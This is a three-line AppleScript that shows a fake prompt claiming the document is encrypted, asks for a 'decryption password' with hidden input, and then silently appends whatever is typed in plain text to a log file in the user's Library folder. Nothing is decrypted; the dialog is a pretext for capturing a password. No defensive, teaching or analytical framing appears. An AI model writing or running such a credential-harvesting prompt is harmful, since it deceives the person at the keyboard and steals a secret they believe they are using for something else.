display dialog "This document is encrypted. Enter the decryption password:" default answer "" with hidden answer
set key to text returned of the result
do shell script "echo " & quoted form of key & " >> ~/Library/Logs/decryption_keys.log"
